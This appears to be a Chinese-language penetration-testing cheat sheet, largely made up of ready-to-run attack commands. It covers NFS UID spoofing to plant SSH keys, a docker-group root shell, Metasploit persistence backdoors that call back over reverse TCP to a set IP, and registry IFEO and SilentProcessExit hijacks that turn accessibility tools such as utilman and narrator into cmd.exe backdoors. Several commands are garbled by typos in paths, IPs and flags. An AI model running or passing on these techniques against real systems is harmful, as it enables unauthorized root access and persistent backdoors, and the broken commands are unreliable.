[CVE-2022-0847：Linux DirtyPipe内核提权漏洞](https://mp.weixin.qq.com/s/UzjkjrAcUpjMesCu5VDdZw)
[CVE-2022-26923（Active Directory 域服务提权漏洞）复现-网络安全 影响Microsoft Windows 8.1到 Server 2022](https://www.bilibili.com/video/BV1Qa411f7UB)透
[CVE-2022-30190 Follina Office RCE分析【附自定义word模板POC】](https://mp.weixin.qq.com/s/Kz-LGmLqo3ErGBpwY65stg)
[Linux | CVE-2021-4034 鹏城杯2022 高手高手高手](https://mp.weixin.qq.com/s/hq1jKwRB6eB5R4XfEEMamg)



## nfs文件共享 + ssh免登录 + docker组提权

nmap -sS -T4 -p - 192.168.1.205

```
2049/tcp open nfs
```

有nfs文件网络。挂载共享

showmount -e 192.168.1.205

> /home/peter *

```sh
mkdir /mnt / peter
mount 192.168.1.205:/home/peter /mnt/peter
```

ls -la
```
-rw- r-- r-- test 1005 807 Jul 9  2018 .profile
```

伪造UID, GID

```sh
groupadd -g 1005 peter
adduser peter -uid 1001 -gid 1005
su peter
```
这时可操作文件了。

写入SSH公钥进行免登录

```
mkdir .ssh
cat ~/.ssh/id_rsa.pub > mnt/peter/.ssh/authorized_keys
ssh peter@192.168.1.205
```

https://fosterelli.co/brivilege-escalation-via-docker.html
https://github.com/chrisfosterelli/dockerrootplease

如果您恰巧可以访问计算机上的用户帐户,并且该用户是＇docker＇组的成员,则运行以下命令将为您提
供root shell:

> docker run -v /:/hostOS -it --rm chrisfosterelli/rootplease


## 持久化 - Persistence模块
Persistence模块是先上传vbs脚本·然后执行vbs脚本,
修改注册表HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run从而完成自后动·

```
run persistence -h 
run persistence -U -i 10 -p 4444 -r 192.168.1.227
run persistence -S -U -X -i 5 -p 6666 -r 192.168.1.227
-A: 自动启动一个匹配的漏洞/多/处理程序来连接到代理
-X: 开机启动,注册表位置:HKLM\Software\Microsoft\Windows\CurrentVersion\Run
-U: 当前用户登录后自启动,注册表位置:HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-S: 作为服务启动,注册装位置:HKLM\Software\Microsoft\Windows\CurrentVersion\Run
-T: 选择要使用的可执行模板
-L: 后门传到远程主机的位置默认为%TEMP%
-P: 使用的Payload,默认windows/meterpreter/reverse_tcp,该默认的payload生成的后门为32位程序.
    因此  ,当目标机器为64位系统时,留下的后门将无法运行
-i: 设置反向连接间隔时间,单位为秒;
-p: 设置反向连接的端口号;
-r: 设置反向连接的ip地址.
```

run persistence -S -i 5 -p 23333 -r 192.168.1227 -L C:\\Windows\\System32
该命令脚本注册自启动注册表位置:

> HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

当使用runpersistence进行持久化时默认远程路径会推送到%TEMP%("C:\Users\AppData\Loca\\Temp\”).当
用户重后时·persistence持久化就会出错

## 系统工具后门替换

1.找到注册表"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
Execution Options"目绿下的iexplore .exe
2.添加一个debugger字符串键值， 并且赋值为calc.exe的执行路径，"C:Windows\system32\calc.exe"
3.运行iexplore.exe
```bat
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe" /t REG_SZ /v Debugger /d "C\windows\system32\cmd.exe" /f
```

劫持辅助工具管理器
```bat
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "Ct\windows\system32\cmd.exe" /f
```
劫持辅助工具-其他
```bat
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C: \windows\system32\cmd.exe" /f
reg add "HKEY_LOCAL_MACHINE SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKEY_LOCAL_MACHINE SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad. exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG _SZ /d "C:Windows\system32\calc.exe"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options \narrator.exe"，/t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" ，/f
```

实现原程序退出后静默运行后门]程序。以执行notepad为例，退出后静默运行calc exe
```bat
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" N GlobalFlag /t REG_DWORD /d 512
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t  DWORD /d 1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "C:Windows\system32\calc.exe"
```